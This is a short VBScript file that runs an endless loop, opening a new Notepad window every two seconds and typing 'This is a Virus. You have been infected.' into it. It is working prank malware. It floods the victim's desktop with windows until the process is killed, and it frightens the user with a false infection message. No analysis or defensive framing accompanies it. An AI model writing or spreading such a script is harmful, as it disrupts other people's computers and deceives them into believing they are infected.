Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 2000
wshShell.run "C:\Windows\System32\notepad.exe"
wshshell.sendkeys "This is a Virus. You have been infected."
loop